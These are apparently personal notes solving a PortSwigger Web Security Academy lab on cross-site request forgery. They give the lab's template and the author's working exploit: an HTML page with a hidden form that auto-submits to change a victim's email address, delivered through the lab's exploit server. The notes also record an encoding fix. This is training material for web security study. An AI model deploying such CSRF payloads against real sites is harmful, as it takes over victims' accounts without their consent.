This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

---

Provided template:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```


Navigate to the labs exploit server, at the top of the page there is a tab to open it. Now paste in our malicious code into the body of the server that will deliver the response. Once we have it working on our account we can click the deliver to victim and complete the lab.

Exploit:

```html
<html> 
	<body>
		<form method="POST" action="https://0a13000b045ad9b380ef266700c5009c.web-security-academy.net/my-account/change-email">
		    <input type="hidden" name="email" value="tester123@gmail.com">
		</form>
		<script>
	        document.forms[0].submit();
		</script>
	<body>
<html> 
```

- It didn't like that the `@` was already encoded, but after changing the email to `tester123@gmail.com` it worked fine:

Change made:

`tester123%40gmail.com` to `tester123@gmail.com`

I think it was trying to encode it twice and the app was not liking it. 

![[IMG/Pasted image 20240922063609.png]]

I modify the email so it's not the same as the one i just used on my own account, and deliver it to the victim which complete the lab: `tester1234@gmailcom`

---



